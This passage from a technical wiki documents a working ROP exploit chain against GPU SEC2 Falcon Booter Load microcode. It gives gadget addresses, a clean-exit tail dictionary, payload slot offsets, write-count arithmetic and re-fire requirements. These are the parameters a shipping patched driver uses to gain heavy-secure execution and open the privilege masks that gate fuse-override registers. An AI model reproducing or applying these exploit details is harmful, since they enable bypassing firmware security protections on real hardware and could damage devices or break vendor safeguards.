> 580, 590, 595 and 610 ported patch sets on the `clanker_driver-port` branch. Only the PLM table
> differs between branches, and the `80` branch changes only the 10 GB card's CFG1 and
> `targetFbBytes`.

### 7.1 The control flow

The chain is short. One write, one clean exit.

```text
0x4d4 dma_copy_block epilogue (mpopaddret $r6)
   pops r0..r6 from DMEM 0xFF3C..0xFF54, then takes RA from 0xFF5C
        |
        v
0x0cbd   mov $r10 $r0          -> r10 = writeValue  (loaded from DMEM 0xFF54)
        |
        v
0x1fbd   mov $r11 $r10         -> r11 = writeValue
         mov $r10 $r0          -> r10 = writeAddr   (reloaded from DMEM 0xFF6C)
        |
        v
0x10aa   reg_write_indirect(r10 = address, r11 = value)
         I[0x1c100] = addr ; I[0x1c200] = value ; I[0x1c000] = 0x800000f2
        |
        v
0x815a -> 0x8e18 -> 0x1fbd -> 0xffbc -> 0x582d -> 0xcbd -> 0x1fbd -> 0xccb -> 0x7f2f
         (the 0x70-byte clean-exit tail, ending inside secure_teardown)
```

Confidence: high, derived by tracing the shipping payload's slot assignments against the
disassembled register flow of `0xcbd`, `0x1fbd` and `0x10aa`.

### 7.2 The tail

The clean-exit tail is a fixed `0x70`-byte (112-byte) gadget block placed relative to the terminator
slot. Expressed as the tooling's `_TAIL` dictionary with `_TAIL_END = 0x70`:

```python
_TAIL = {0x00: 0x815a, 0x04: 0x8e18, 0x08: 0,      0x0c: 0x815a,
         0x10: 0,      0x14: 0,      0x18: 0x1fbd, 0x24: 0xffbc,
         0x2c: 0x582d, 0x38: 0,      0x3c: 0xcbd,  0x4c: 0x3,
         0x54: 0x1fbd, 0x68: 0xccb,  0x6c: 0x7f2f}
```

In the shipping payload the terminator slot base is payload offset `0xf78c` (DMEM `0xFF8C`), the
tail runs to `0xf7fc` (DMEM `0xFFFC`), and its highest written dword sits at `0xf7f8` = 63,480,
ending at 63,484: four bytes inside the 63,488-byte buffer. The slots the tooling lists as `0` at
`+0x08`, `+0x14` and `+0x38` are the canary slots and carry `0xc0deca7e` in the shipping payload.

This tail is labelled HW-PROVEN in the driverless tooling, is identical between
`refire_chain_v6.py` and `refire_chain_v9.py`, and matches the shipping payload exactly.

> [!NOTE]
> **Lineage, precisely**
>
> The *tail* is byte-identical to `refire_chain_v6._TAIL`, and `p(0x1100, 0x7)` matches too. The
> *head* is not: v6 plants value and address adjacently at payload `0xF750`/`0xF754` with RA
> `0x10b9` at `0xF75C`, whereas shipping plants value at `0xf754`, RA `0x00000cbd` at `0xf75c`,
> address at `0xf76c` and `0x1fbd` at `0xf774`. Lineage is real; "byte-for-byte the same chain" is
> overstated. Separately, two of the shipping payload's gadget addresses (`0x10aa` and `0x0ccb`)
> appear in a community ROP writeup published three days before the patch, with matching roles.
> Whether the shipping payload was derived from the community chain or independently produced
> cannot be settled from the artifacts alone.

### 7.3 Why the exit is clean

The tail exits **through** `secure_teardown` rather than around it, and it still leaves the SEC2
reset PLM at `0xff` rather than the usual `0x8f` taint. The mechanism is the `0x00000007` planted at
DMEM `0x1900`: that routes through `f100_field_save_restore` at IMEM `0x1d3b`, a read-modify-write
of register `0xf100` bits [4:6] where `r0 == 0` saves the field to DMEM `0x1900` and clears it and
`r0 != 0` restores it from `0x1900`. Register `0xf100` reads `0xbadf5040` at PL0 because it is only
reachable inside the HS teardown context.

> [!NOTE]
> **Open problem: is `secure_teardown`'s body actually executed?**
>
> `0x7f2f` is described as "the exit gadget inside `secure_teardown`, never returned to". Whether
> the full teardown body (SCP wipe, 64 KB DMEM zero, GPR clear) executes before the `exit`, or
> whether `0x7f2f` lands past most of it, is not established anywhere in the archive. It matters
> because a full DMEM zero between fires changes what state can carry over. Settled by the byte
> offset of `0x7f2f` within `secure_teardown`'s body relative to the SCP-wipe and DMEM-zero loops.

> [!NOTE]
> **Open problem: `0x00000ccb` in the shipping payload**
>
> Two readings of the same call coexist: "the release call at `0xccb`", paired with the `0xd66`
> acquire, versus "bit 24 set by authenticate". Independently, a hard constraint was stated that
> no ROP exit path may route through `regtable_rw_indexed (0x0ccb)`, because the `0xF800` payload
> linearly smashes the register descriptor tables at DMEM `0x2383` and `0x8e08` that it indexes,
> and a 2026-07-06 isolation matrix showed every write-carrying rejoin chain dying at `0xccb`. Yet
> the shipping payload plants `0x00000ccb` at DMEM `0xFFF4` and works. Settled by tracing whether
> DMEM `0xFFF4` is ever loaded into PC during the shipping chain's unwind, or whether it is a
> dead saved slot in a frame that is never returned through. This is the most tractable open item
> in the domain, because both the payload and the disassembly are in hand.

---

## 8. Writes per fire

> [!NOTE]
> **The shipping driver does exactly ONE arbitrary BAR0 write per Booter Load fire**
>
> The payload carries exactly one `(writeAddr, writeValue)` pair, at payload offsets `0xf76c` and
> `0xf754`. The driver re-fires Booter Load once per register it wants to touch, with up to two
> attempts per register, and verifies by read-back. That is 4 to 8 exploit fires per driver load
> plus the one normal boot. See [falcon-and-booter.md](falcon-and-booter.md#125-how-many-times-the-booter-runs).

The write count is a property of the *tail*, not of the mechanism. This is why the source material
carries five different answers.

| Chain / tail | Writes per fire | Basis |
|---|---|---|
| Shipping driver | **1** | Read from shipping source |
| `refire_chain_v2.py`, full mutex tail | ≤ 2 | Hard-coded `raise ValueError("<=2 writes/fire (full mutex tail caps DMEM at stock SP)")` |
| mutexfree / `0x814e` tail | ≤ 4 | Highest slot = `63392 + (N-1)*24`; N=4 gives 63,464 (fits), N=5 overflows the `0xF800` payload by exactly 4 bytes |
| Compressed six-write layout | 6 | 6 × 24 B + a 9-word (36 B) tail = 180 B from DMEM `0xFF48`; sacrifices the `0x27fa` WPR2 rejoin and the `0x1d9f` stack eater |
| Re-entrant design, developer statement | 6 | 4 spent restoring booter-checked registers, 2 payload writes, mutex released in the final call |

Supporting arithmetic:

- Additional-write stride: `0x18` = 24 bytes, set by `0x10aa`'s `mpopaddret $r3 0x4` epilogue.
- Terminator slot formula: `63348 + (N-1)*0x18`.
- Terminator landing SP: `E = 0x800 + 63392 + shift`, giving DMEM `0xFFA0` for one write, `0xFFB8`
  for two, `0xFFD0` for three.
- `multiwrite_then_814e` reference: `term_slot = 63388`, SP `0xFFA0`. At N = 3 writes,
  `term_slot = 63396`, `tail_shift = +8`, highest tail slot 63448 (DMEM `0xFFD8`), under the payload
  maximum of 63,488.
- The five-stanza layout with the 16-word (64-byte) alternative tail totals 184 bytes
  (5 × 24 B + 64 B) and does not fit the 180-byte budget from DMEM `0xFF48`. The shipping
  five-stanza layout uses a 15-word (60-byte) tail: 120 B + 60 B = 180 B exactly.

> [!NOTE]
> **Open problem: is the mutexfree cap really 4 or really 2?**
>
> The slot formula derives ≤ 4; the v2 engine hard-codes ≤ 2 with the comment "full mutex tail
> caps DMEM at stock SP". An independently posted 5-write poke layout places writes 2-5 at DMEM
> `0xFF60`, `0xFF78`, `0xFF90`, `0xFFA8`, has the last `0x10aa` pop `0xFFC0`..`0xFFD0` and runs a
> fixed 12-dword tail from `0xFFD4` to `0xFFFC`, which is arithmetically self-consistent and fits.
> The three numbers use three different tails, so they may all be correct for their own tail, but
> no source states the reconciliation and the exact tail bytes for the 5-write variant are not
> given. Settled by computing the highest occupied slot for the exact tail each engine emits, or
> by firing a five-write and a six-write chain and reading all writes back.

---

## 9. Rejoin strategies and terminators

Different terminators trade the SEC2 reset PLM, the ACR mutex, and whether the booter's own boot
completes.

| Terminator | resetPLM after | ACR mutex | `0x001180f8` nibble | Outcome |
|---|---|---|---|---|
| Raw `exit` (`f8 02`) at `0x8117` | `0xff` | stranded | 0 | Skips finalize. Booter Load reports `0x65`, MB0 `0x31`. |
| Spin-park at `0x4a7` | `0xff` (stays in HS) | stranded | unchanged | An earlier HS write of `0x8403C4 = 0xff` sticks. |
| `mutexrel3` (`0x1c0e` + spin) | | released | 0 | |
| `814e` with fail_code = 1 | | | `0xf` | `0x814e -> main 0x80D7`; next booter reports `0x29`. |
| `mutexfree` | `0xff` | released | 0 or `0xf` by write count | The only combination achieving open resetPLM, mutex released and a clean halt. Capped at about 4 writes. |
| `whole_stack_rejoin` | `0x8f` | released | `0x1` | Reconstructs `main`'s full frame with `D[0xFFEC] = 1`. The only terminator that finalizes `0x001180f8` to `0x11000000`, what a real boot leaves. Reached "RISC-V active". |
| `secure_teardown` via `0x7f2f` | `0xff` **if** `D[0x1900] = 7` | not released | never written | **Shipping.** |

Rejoining higher up the call chain frees stack: rejoining `booter_load_wrap 0x8137` at `0x814e`
(SP `0xFFD6`) rather than `booter_load_wpr_main 0x22ba` at `0x2740` (SP `0xFF98`) saves 62 bytes,
roughly three extra writes, and `0x22ba` does very little anyway when it receives a non-zero return
value in `$r10`. Confidence: medium, reasoned from the verified stack layout, and superseded
operationally by repeated Booter passes.

`multiwrite_then_814e` is the HW-PROVEN clean tail of the driverless lineage: it rejoins
`booter_load_wrap` at `0x814e` with `r10` set to a fake failure code, so SEC2 exits HS the clean,
load2-recoverable way. Tail shape:
`0x1fca -> 0x1fb9 (r10 <- fail_code) -> 0x1fca -> 0x814e -> 0x8173 -> main`. Write order is preserved
and `FUSE_SS_PLM` must be `writes[0]`.

Two mechanical payload bugs are worth remembering as a class, because in both cases the chain
"worked" but silently dropped a write: a slot typo of `0xFF45` for `0xFF54` (offset 63316, write 1's
`$r0` slot); and leaving `0x00008262` at `0xFFBC`, which acts as a plain `ret`, so write 5's operands
loaded at `0xFFB0`/`0xFFB4` but were never issued.

---

## 10. Requirements that are easy to miss

- **Flush the CPU caches.** The signature DMA is non-coherent. Without an explicit flush the Falcon
  reads stale RAM. The driverless tooling JIT-assembles a 17-byte x86-64 stub and maps it
  `PROT_EXEC`; the shipping driver calls `memdescFlushCpuCaches()` on both the signature memdesc and
  the WPR-meta descriptor after every payload refill.
- **Stage a valid radix3 page table** if firing without a driver, or the booter's pre-signature DMAs
  fail with cause `0x9`.
- **Re-arm WPR2 before every fire.** Each fire re-carves WPR2, and a second Booter Load otherwise
  aborts with "WPR2 already up". The shipping driver saves `0x001fa824`/`0x001fa828` once and
  rewrites the saved pair before each of the up-to-8 attempts, then once more after the loop. The
  empty/INIT encoding is LO `0x0fffffff` (or `0x1FFFFE00` as the driverless tools write it), HI `0`,
  and HI = 0 is what makes `kgspIsWpr2Up()` return false.
- **Only the first fire after a reset lands with resetPLM `0xff`.** Every subsequent fire without an
  FLR is stuck at HS state `0x3002`. An engine reset (write 0 to `0x8403C0`) dropped HS from `0x3000`
  to `0x3002`, left resetPLM at `0xff`, left the geometry intact through a modprobe and brought
  DMACTL back up, but repeated fires still failed with `0x62:0x65:2674`.

---

## 11. What the primitive is actually used for

Once HS code execution exists it is used only as a **pivot**. The chain opens the privilege-level
masks gating the fuse-override shadow registers, after which ordinary PL0 host BAR0 writes drive the
overrides with no further exploit. That is exactly the shipping patch's shape: four exploit-driven
PLM opens followed by four plain `GPU_REG_WR32()` calls.

The design constraint that produced it was stated before the driver existed: ROP writes and the
stack frames needed to preserve image validation compete for the same DMEM range
`0xFF3C`-`0xFFB8`, so a five-write chain and a full `0x37b7` reconstruction cannot coexist. The
stated resolution was to keep only the writes that genuinely require HS in the ROP and do the rest
host-side once the PLM is open.

One measurement is worth flagging because it removed a whole class of work: **a single heavy-secure
broadcast write to CFG1 at `0x009A0204` propagates to all 20 per-FBPA `CSTATUS` registers**,
measured as a `0x200` to `0x800` transition across every live FBPA. HS bypasses the FBPA PLMs
entirely; opening them was only ever needed for host-PL0 per-FBPA writes at
`0x00900204 + n*0x4000`. See [memory geometry](memory-geometry.md).

---

## Related pages

- [The SEC2 Falcon and the Booter Load microcode](falcon-and-booter.md)
- [Privilege Level Masks](privilege-level-masks.md)
- [Memory geometry](memory-geometry.md) and [compute throttle](compute-throttle.md)
- [Driver patches](driver-patches.md)
- [Register reference](register-reference.md)
- [Dead ends](../history/dead-ends.md) and [tool lineage](../history/tool-lineage.md)
- [Clean room and provenance](../history/clean-room-and-provenance.md)
- [Glossary](../start/glossary.md)
